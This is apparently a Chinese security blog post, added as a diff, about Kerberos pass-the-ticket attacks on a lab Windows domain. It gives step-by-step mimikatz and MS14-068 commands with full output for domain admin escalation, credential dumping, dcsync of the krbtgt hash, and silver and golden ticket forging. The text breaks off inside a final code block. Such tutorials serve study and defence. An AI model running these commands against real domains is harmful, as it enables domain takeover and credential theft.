@@ -1,0 +1,375 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>内网PTT | Wu1alaのBlog</title>
+  <meta name="author" content="Wu1ala">
+  
+  <meta name="description" content="xxxxx">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="内网PTT"/>
+  <meta property="og:site_name" content="Wu1alaのBlog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Wu1alaのBlog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 内网PTT</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>ptt攻击的部分就不是简单的NTLM认证了，它是利用Kerberos协议进行攻击的，这里就介绍三种常见的攻击方法：</p>
+<p>MS16-068，Golden ticket，SILVER ticket。</p>
+<span id="more"></span>
+
+<p>之前介绍了Kerberos协议具体工作方法，在域中，简要介绍一下：</p>
+<ul>
+<li>客户机将明文密码进行NTLM哈希,然后和时间戳一起加密(使用krbtgt密码hash作为密钥)，发送给kdc（域控），kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)</li>
+<li>将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中TGT数据</li>
+<li>然后客户机将TGT发送给域控制器KDC请求TGS（票证授权服务）票证，并且对TGT进行检测</li>
+<li>检测成功之后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回给客户机。</li>
+</ul>
+<h3 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证.</span><br><span class="line"></span><br><span class="line">windows域中使用kerberos协议过程中，为了让SS服务器判断Client是否有权限访问服务，引入了PAC机制。构造PAC也是这个漏洞的根本。</span><br><span class="line">1. 在请求AS时，将require_PAC设置成False。</span><br><span class="line">2. 在请求TGS时，构造PAC，然后使用MD5签名（PAC尾部的签名算法可以任意指定），PAC并没有放在TGT中发送，而是在请求包的其他位置（但是还是可以解析）。</span><br><span class="line">3. TGS_REP返回的不是会话密钥，而是返回的带PAC的TGT（微软的锅）</span><br></pre></td></tr></table></figure>
+
+<p>造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo |find &quot;3011780&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>涉及系统：Windows Server 2003<br>Windows Vista<br>Windows Server 2008<br>Windows 7<br>Windows Server 2008 R2<br>Windows 8 and Windows 8.1<br>Windows Server 2012 and Windows Server 2012 R2<br>Server Core installation option</p>
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>1.使用whoami /user得到普通域用户的sid</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\cve-test&gt;whoami /user</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">用户名       SID</span><br><span class="line">============ ==============================================</span><br><span class="line">lab\cve-test S-1-5-21-1799307087-3941118632-1964125693-2102</span><br><span class="line"></span><br><span class="line">C:\Users\cve-test&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>2.利用工具 <a target="_blank" rel="noopener" href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">ms14-068</a></p>
+<p>使用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码</span><br></pre></td></tr></table></figure>
+
+<p>运行实例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u cve-test@lab.com -s S-1-5-21-1799307087-3941118632-1964125693-2102 -d 192.168.100.30 -p 123.com</span><br></pre></td></tr></table></figure>
+
+<p>输出内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\win7\Desktop&gt;MS14-068.exe -u cve-test@lab.com -s S-1-5-21-1799307087-3941118632-1964125693-2102 -d 192.168.100.30 -p 123.com</span><br><span class="line">  [+] Building AS-REQ <span class="keyword">for</span> 192.168.100.30... Done!</span><br><span class="line">  [+] Sending AS-REQ to 192.168.100.30... Done!</span><br><span class="line">  [+] Receiving AS-REP from 192.168.100.30... Done!</span><br><span class="line">  [+] Parsing AS-REP from 192.168.100.30... Done!</span><br><span class="line">  [+] Building TGS-REQ <span class="keyword">for</span> 192.168.100.30... Done!</span><br><span class="line">  [+] Sending TGS-REQ to 192.168.100.30... Done!</span><br><span class="line">  [+] Receiving TGS-REP from 192.168.100.30... Done!</span><br><span class="line">  [+] Parsing TGS-REP from 192.168.100.30... Done!</span><br><span class="line">  [+] Creating ccache file <span class="string">&#x27;TGT_cve-test@lab.com.ccache&#x27;</span>... Done!</span><br></pre></td></tr></table></figure>
+
+
+
+<p>3.票据注入</p>
+<p>使用mimikatz将票据注入到当前内存中，伪造凭证，如果成功则拥有域管理权限，可任意访问域中所有机器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br><span class="line">mimikatz # kerberos::list          //查看当前机器凭证</span><br><span class="line">mimikatz # kerberos::ptc 票据文件   //将票据注入到内存中</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\win7\Desktop\mimikatz_trunk1 2\x64&gt;mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Jul  9 2021 22:59:41</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::list</span></span><br><span class="line"></span><br><span class="line">[00000000] - 0x00000017 - rc4_hmac_nt</span><br><span class="line">   Start/End/MaxRenew: 2021/12/17 10:54:07 ; 2021/12/17 20:54:06 ; 2021/12/24 10:54:06</span><br><span class="line">   Server Name       : krbtgt/LAB.COM @ LAB.COM</span><br><span class="line">   Client Name       : cve-test @ LAB.COM</span><br><span class="line">   Flags 50a10000    : name_canonicalize ; pre_authent ; renewable ; proxiable ; forwardable ;</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::purge</span></span><br><span class="line">Ticket(s) purge <span class="keyword">for</span> current session is OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::list</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::ptc TGT_cve-test@lab.com.ccache</span></span><br><span class="line"></span><br><span class="line">Principal : (01) : cve-test ; @ LAB.COM</span><br><span class="line"></span><br><span class="line">Data 0</span><br><span class="line">           Start/End/MaxRenew: 2021/12/17 10:57:51 ; 2021/12/17 20:57:51 ; 2021/12/24 10:57:51</span><br><span class="line">           Service Name (01) : krbtgt ; LAB.COM ; @ LAB.COM</span><br><span class="line">           Target Name  (01) : krbtgt ; LAB.COM ; @ LAB.COM</span><br><span class="line">           Client Name  (01) : cve-test ; @ LAB.COM</span><br><span class="line">           Flags 50a10000    : name_canonicalize ; pre_authent ; renewable ; proxiable ; forwardable ;</span><br><span class="line">           Session Key       : 0x00000017 - rc4_hmac_nt</span><br><span class="line">             8f1c17519f93dab38a391bc832a477d5</span><br><span class="line">           Ticket            : 0x00000000 - null              ; kvno = 2        [...]</span><br><span class="line">           * Injecting ticket : OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure>
+
+<p>注入票据后，可以使用dir \x.x.x.x\c$ 来访问域控（后续利用参考，wmic等方式）</p>
+<h3 id="白银票据（Silver-ticket）"><a href="#白银票据（Silver-ticket）" class="headerlink" title="白银票据（Silver ticket）"></a>白银票据（Silver ticket）</h3><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p>silver ticket和golden ticket不同的是,它不需要和域控制器进行通信，原理是伪造TGS，使用的是计算机账户的hash进行加密的，所以只能访问指定的权限。</p>
+<p>首先需要目标的机器账号hash。然后在进行伪造权限，进行ptt</p>
+<p>目标机器为win2008，攻击机器为win7</p>
+<p>1.使用mimikatz获取到win2008的机器账号(WIN2008$)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># sekurlsa::logonpasswords</span></span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WIN2008$</span><br><span class="line">Domain            : LAB</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2021/12/16 13:11:16</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : WIN2008$</span><br><span class="line">	 * Domain   : LAB</span><br><span class="line">	 * NTLM     : f78dd9e2f973830056e39dff42af4930</span><br><span class="line">	 * SHA1     : b44b0b6700f297142b5e635ceb5b8ae6dcf9cae5</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br></pre></td></tr></table></figure>
+
+<p>2.在普通域用户机器中进行ptt</p>
+<p>获取SID,票据利用中不需要SID最后几位的身份识别码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\cve-test&gt;whoami /user</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">用户名       SID</span><br><span class="line">============ ==============================================</span><br><span class="line">lab\cve-test S-1-5-21-1799307087-3941118632-1964125693-2102</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>进行ptt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:lab.com /sid:S-1-5-21-1799307087-3941118632-1964125693  /target:win2008.lab.com /rc4:f78dd9e2f973830056e39dff42af4930  /service:cifs /user:mary /ptt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">.<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Jul  9 2021 22:59:41</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># log</span></span><br><span class="line">Using <span class="string">&#x27;mimikatz.log&#x27;</span> <span class="keyword">for</span> logfile : OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># kerberos::golden /domain:lab.com /sid:S-1-5-21-1799307087-3941118632-1964125693  /target:win2008.lab.com /rc4:f78dd9e2f973830056e39dff42af4930  /service:cifs /user:mary /ptt</span></span><br><span class="line">User      : mary</span><br><span class="line">Domain    : lab.com (LAB)</span><br><span class="line">SID       : S-1-5-21-1799307087-3941118632-1964125693</span><br><span class="line">User Id   : 500</span><br><span class="line">Groups Id : *513 512 520 518 519 </span><br><span class="line">ServiceKey: f78dd9e2f973830056e39dff42af4930 - rc4_hmac_nt      </span><br><span class="line">Service   : cifs</span><br><span class="line">Target    : 192.168.100.37</span><br><span class="line">Lifetime  : 2021/12/19 14:57:51 ; 2031/12/17 14:57:51 ; 2031/12/17 14:57:51</span><br><span class="line">-&gt; Ticket : ** Pass The Ticket **</span><br><span class="line"></span><br><span class="line"> * PAC generated</span><br><span class="line"> * PAC signed</span><br><span class="line"> * EncTicketPart generated</span><br><span class="line"> * EncTicketPart encrypted</span><br><span class="line"> * KrbCred generated</span><br><span class="line"></span><br><span class="line">Golden ticket <span class="keyword">for</span> <span class="string">&#x27;mary @ lab.com&#x27;</span> successfully submitted <span class="keyword">for</span> current session</span><br></pre></td></tr></table></figure>
+
+<p>可成功访问win2008的机器，后续利用参考wmic</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\cve-test\Desktop\mimikatz_trunk1 2\x64&gt;dir \\win2008\c$</span><br><span class="line"> 驱动器 \\win2008\c$ 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 A09D-7ABE</span><br><span class="line"></span><br><span class="line"> \\win2008\c$ 的目录</span><br><span class="line"></span><br><span class="line">2009/07/14  11:20    &lt;DIR&gt;          PerfLogs</span><br><span class="line">2021/08/23  18:27    &lt;DIR&gt;          Program Files</span><br><span class="line">2009/07/14  13:06    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">2021/12/14  22:38    &lt;DIR&gt;          Users</span><br><span class="line">2021/08/23  20:40    &lt;DIR&gt;          Windows</span><br><span class="line">2021/12/16  15:25                59 新建文本文档.txt</span><br><span class="line">               1 个文件             59 字节</span><br><span class="line">               5 个目录 30,594,490,368 可用字节</span><br><span class="line"></span><br><span class="line">C:\Users\cve-test\Desktop\mimikatz_trunk1 2\x64&gt;whoami</span><br><span class="line">lab\cve-test</span><br><span class="line"></span><br><span class="line">C:\Users\cve-test\Desktop\mimikatz_trunk1 2\x64&gt;hostname</span><br><span class="line">win7</span><br><span class="line"></span><br><span class="line">C:\Users\cve-test\Desktop\mimikatz_trunk1 2\x64&gt;klist</span><br><span class="line"></span><br><span class="line">当前登录 ID 是 0:0x5028a</span><br><span class="line"></span><br><span class="line">缓存的票证: (2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt;     客户端: mary @ lab.com</span></span><br><span class="line">        服务器: cifs/win2008.lab.com @ lab.com</span><br><span class="line">        Kerberos 票证加密类型: RSADSI RC4-HMAC(NT)</span><br><span class="line">        票证标志 0x40a00000 -&gt; forwardable renewable pre_authent</span><br><span class="line">        开始时间: 12/19/2021 15:12:39 (本地)</span><br><span class="line">        结束时间:   12/17/2031 15:12:39 (本地)</span><br><span class="line">        续订时间: 12/17/2031 15:12:39 (本地)</span><br><span class="line">        会话密钥类型: RSADSI RC4-HMAC(NT)</span><br><span class="line">        </span><br><span class="line">C:\Users\cve-test\Desktop\mimikatz_trunk1 2\x64&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="黄金票据（Golden-ticket）"><a href="#黄金票据（Golden-ticket）" class="headerlink" title="黄金票据（Golden ticket）"></a>黄金票据（Golden ticket）</h3><h4 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h4><p>Golden ticket的作用是可以生成任意用户的tgt,那么问题就来了,是什么条件能够让他生成任意用户的tgt呢？还得要看kerberos认证的过程,在windows认证过程中，客户端将自己的信息发送给KDC,然后KDC使用krbtgt用户密码的hash作为密钥进行加密，生成TGT。</p>
+<p>那么如果获取到了krbtgt的密码hash值，是不是就可以伪造任意tgt了。<strong>因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限,黄金凭据可以理解为一个后门</strong></p>
+<p>伪造黄金凭据需要具备下面条件：</p>
+<ul>
+<li>krbtgt用户的hash(就意味着你已经有域控制器权限了)</li>
+<li>域名称</li>
+<li>域的SID值</li>
+<li>要伪造的用户名</li>
+</ul>
+<p>登陆域控，dump krbtgt用户的hash值，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">lsadump::dcsync /dc01.lab.com /all</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Jul  9 2021 22:59:41</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># log</span></span><br><span class="line">Using <span class="string">&#x27;mimikatz.log&#x27;</span> <span class="keyword">for</span> logfile : OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># lsadump::dcsync /dc01.lab.com /all</span></span><br><span class="line">[DC] <span class="string">&#x27;lab.com&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;DC01.lab.com&#x27;</span> will be the DC server</span><br><span class="line">[DC] Exporting domain <span class="string">&#x27;lab.com&#x27;</span></span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Object Security ID   : S-1-5-21-1799307087-3941118632-1964125693-502</span><br><span class="line">Object Relative ID   : 502</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: 392ffcfeacc6914f5a2e4d3f7893457d</span><br><span class="line"></span><br><span class="line">Object RDN           : Read-only Domain Controllers</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : Read-only Domain Controllers</span><br><span class="line">Object Security ID   : S-1-5-21-1799307087-3941118632-1964125693-521</span><br><span class="line">Object Relative ID   : 521</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>进行ptt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:lab.com /sid:S-1-5-21-1799307087-3941118632-1964125693 /krbtgt:392ffcfeacc6914f5a2e4d3f7893457d /ticket:golden.kiribi</span><br><span class="line"></span><br><span class="line">kerberos::golden /admin:administrator /domain:lab.com /sid:S-1-5-21-1799307087-3941118632-1964125693 /krbtgt:392ffcfeacc6914f5a2e4d3f7893457d /ptt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\cve-test\Desktop\mimikatz_trunk1 